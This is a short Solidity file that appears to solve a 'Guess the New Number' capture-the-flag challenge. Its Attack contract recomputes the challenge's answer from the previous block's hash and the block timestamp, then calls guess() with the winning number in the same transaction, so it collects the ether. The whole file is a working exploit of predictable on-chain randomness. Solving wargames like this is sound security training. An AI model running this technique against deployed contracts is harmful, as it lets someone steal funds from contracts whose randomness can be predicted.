// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGuesstheNewNumberChallenge {
    
    function guess(uint8)external payable;
}
contract Attack{
    
   function attack(IGuesstheNewNumberChallenge  num)external payable{
        //copying the logic for getting the answer 
        num.guess{value:msg.value}(uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))));

   }
   //receiving ether
   receive() external payable { }
    
}